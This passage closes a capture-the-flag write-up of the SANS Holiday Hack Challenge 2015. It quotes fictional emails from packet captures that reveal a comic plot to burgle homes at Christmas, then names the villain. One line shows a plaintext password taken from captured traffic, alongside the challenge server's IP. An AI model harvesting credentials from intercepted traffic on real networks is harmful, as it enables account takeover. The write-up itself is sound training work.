        + ON Semiconductor AR0330: 3 MP 1/3" CMOS Digital Image Sensor
        + Atheros AR6233X Wi-Fi adapter
        + Texas Instruments TPS65053 switching power supply
        + Samsung K4B2G16460 2GB SSDR3 SDRAM
        + Samsung K9F1G08U0D 1GB NAND Flash

        Given the volume of this purchase, we fully expect the 35% discount you
        mentioned during our phone discussion.  If you cannot agree to this pricing,
        we'll place our order elsewhere.

        We need delivery of components to begin no later than April 1, 2015, with
        250,000 units coming each week, with all of them arriving no later than June
        1, 2015.

        Finally, as you know, this project requires the utmost secrecy.   Tell NO
        ONE about our order, especially any nosy law enforcement authorities.

        Regards,

        -CW


SG-03:

        From: "c" <c@atnascorp.com>
        To: <burglerlackeys@atnascorp.com>
        Subject: All Systems Go for Dec 24, 2015
        Date: Tue, 1 Dec 2015 11:33:56 -0500

        My Burgling Friends,

        Our long-running plan is nearly complete, and I'm writing to share the date
        when your thieving will commence!  On the morning of December 24, 2015, each
        individual burglar on this email list will receive a detailed itinerary of
        specific houses and an inventory of items to steal from each house, along
        with still photos of where to locate each item.  The message will also
        include a specific path optimized for you to hit your assigned houses
        quickly and efficiently the night of December 24, 2015 after dark.

        Further, we've selected the items to steal based on a detailed analysis of
        what commands the highest prices on the hot-items open market.  I caution
        you - steal only the items included on the list.  DO NOT waste time grabbing
        anything else from a house.  There's no sense whatsoever grabbing crumbs too
        small for a mouse!

        As to the details of the plan, remember to wear the Santa suit we provided
        you, and bring the extra large bag for all your stolen goods.

        If any children observe you in their houses that night, remember to tell
        them that you are actually "Santy Claus", and that you need to send the
        specific items you are taking to your workshop for repair.  Describe it in a
        very friendly manner, get the child a drink of water, pat him or her on the
        head, and send the little moppet back to bed.  Then, finish the deed, and
        get out of there.  It's all quite simple - go to each house, grab the loot,
        and return it to the designated drop-off area so we can resell it.  And,
        above all, avoid Mount Crumpit!

        As we agreed, we'll split the proceeds from our sale 50-50 with each
        burglar.

        Oh, and I've heard that many of you are asking where the name ATNAS comes
        from.  Why, it's reverse SANTA, of course.  Instead of bringing presents on
        Christmas, we'll be stealing them!

        Thank you for your partnership in this endeavor.

        Signed:

        -CLW
        President and CEO of ATNAS Corporation

SG-04:

        From: "c" <c@atnascorp.com>
        To: <psychdoctor@whovillepsychiatrists.com>
        Subject: Answer To Your Question
        Date: Thu, 3 Dec 2015 13:38:15 -0500

        Dr. O'Malley,

        In your recent email, you inquired:

        \> When did you first notice your anxiety about the holiday season?

        Anxiety is hardly the word for it.  It's a deep-seated hatred, Doctor.

        Before I get into details, please allow me to remind you that we operate
        under the strictest doctor-patient confidentiality agreement in the
        business.  I have some very powerful lawyers whom I'd hate to invoke in the
        event of some leak on your part.  I seek your help because you are the best
        psychiatrist in all of Who-ville.

        To answer your question directly, as a young child (I must have been no more
        than two), I experienced a life-changing interaction.  Very late on
        Christmas Eve, I was awakened to find a grotesque green Who dressed in a
        tattered Santa Claus outfit, standing in my barren living room, attempting
        to shove our holiday tree up the chimney.  My senses heightened, I put on my
        best little-girl innocent voice and asked him what he was doing.  He
        explained that he was "Santy Claus" and needed to send the tree for repair.
        I instantly knew it was a lie, but I humored the old thief so I could escape
        to the safety of my bed.  That horrifying interaction ruined Christmas for
        me that year, and I was terrified of the whole holiday season throughout my
        teen years.

        I later learned that the green Who was known as "the Grinch" and had lost
        his mind in the middle of a crime spree to steal Christmas presents.  At the
        very moment of his criminal triumph, he had a pitiful change of heart and
        started playing all nicey-nice.  What an amateur!  When I became an adult,
        my fear of Christmas boiled into true hatred of the whole holiday season.  I
        knew that I had to stop Christmas from coming.  But how?

        I vowed to finish what the Grinch had started, but to do it at a far larger
        scale.  Using the latest technology and a distributed channel of burglars,
        we'd rob 2 million houses, grabbing their most precious gifts, and selling
        them on the open market.  We'll destroy Christmas as two million homes full
        of people all cry "BOO-HOO", and we'll turn a handy profit on the whole
        deal.

        Is this "wrong"?  I simply don't care.  I bear the bitter scars of the
        Grinch's malfeasance, and singing a little "Fahoo Fores" isn't gonna fix
        that!

        What is your advice, doctor?

        Signed,

        Cindy Lou Who

SG-05:

        From: "Grinch" <grinch@who-villeisp.com>
        To: <c@atnascorp.com>
        Subject: My Apologies & Holiday Greetings
        Date: Tue, 15 Dec 2015 16:09:40 -0500

        Dear Cindy Lou,

        I am writing to apologize for what I did to you so long ago.  I wronged you
        and all the Whos down in Who-ville due to my extreme misunderstanding of
        Christmas and a deep-seated hatred.  I should have never lied to you, and I
        should have never stolen those gifts on Christmas Eve.  I realize that even
        returning them on Christmas morn didn't erase my crimes completely.  I seek
        your forgiveness.

        You see, on Mount Crumpit that fateful Christmas morning, I learned th[4 bytes missing in capture file]at
        Christmas doesn't come from a store.  In fact, I discovered that Christmas
        means a whole lot more!

        When I returned their gifts, the Whos embraced me.  They forgave.  I was
        stunned, and my heart grew even more.  Why, they even let me carve the roast
        beast!  They demonstrated to me that the holiday season is, in part, about
        forgiveness and love, and that's the gift that all the Whos gave to me that
        morning so long ago.  I honestly tear up thinking about it.

        I don't expect you to forgive me, Cindy Lou.  But, you have my deepest and
        most sincere apologies.

        And, above all, don't let my horrible actions from so long ago taint you in
        any way.  I understand you've grown into an amazing business leader.  You
        are a precious and beautiful Who, my dear.  Please use your skills wisely
        and to help and support your fellow Who, especially during the holidays.

        I sincerely wish you a holiday season full of kindness and warmth,

        --The Grinch

It is also worth noting that we were able to collect Cindy's password from this pcap:

        User: c
        Password: AllYourPresentsAreBelongToMe

104.196.40.60 is the IP she connects to...

<img src="/images/sans_2015/tom-says-no.png"/>

Maybe next time!

### Image Evidence

I collected up each of the staticky images from the SuperGnomes and used the tool
*Stegsolve.jar* to xor the images and reveal the final image:

<img src="/images/sans_2015/clw-desk.png"/>

**9) Based on evidence you recover from the SuperGnomes’ packet capture ZIP files and any staticky images you find, what is the nefarious plot of ATNAS Corporation?**

After reviewing all of the evidence in the packet captures and images, we discover the nefarious plot of the ATNAS corp. Cindy Lou Who was traumatized by
the witnessing the actions of the Grinch on that Christmas night. She has grown to hate Christmas and believes she can improve on the Grinch's plan. Her plot is to distribute gnomes to as many homes as possible by Dec. 24.

The gnomes purpose is to gather information about the households, specifically the belongings in the homes. This information gathering includes taking still snapshots of the rooms they are placed in and sniffing network traffic for specific terms (outlined in sniffer\_hit\_list.txt). All of this info is sent to the associated SuperGnomes where it will be reviewed by ATNAS. ATNAS will use this information to organize and deploy burglars, dressed as Santa, to the homes to steal specific presents. These items will be sold and the profits will be split 50/50 between the ATNAS corp and the burglars.

The summary of the plan is revealed very eloquently by Cindy:

        "Oh, and I've heard that many of you are asking where the name ATNAS comes from. 
        Why, it's reverse SANTA, of course. Instead of bringing presents on Christmas, 
        we'll be stealing them."

**10) Who is the villain behind the nefarious plot.**

As we can see in the email and photo evidence, Cindy Lou Who, President and CEO of ATNAS Corporation, is the mastermind behind the nefarious plot.

## Conclusion

What a great challenge and amazing learning experience. I would like to blame
Netflix and "Making a Murderer" for sabotaging and preventing me from solving
SG-05 before the submission deadline. :)

In all seriousness, I would like to thank all the folks over at SANS and CounterHack
for their amazing work! I cannot wait to see what they have in store for next year!

<img src="/images/sans_2015/ed.png"/>

Had to include a final picture with one of my favorite people and birthday-sharer, [Ed Skoudis](https://twitter.com/edskoudis).

Thanks!

Mike

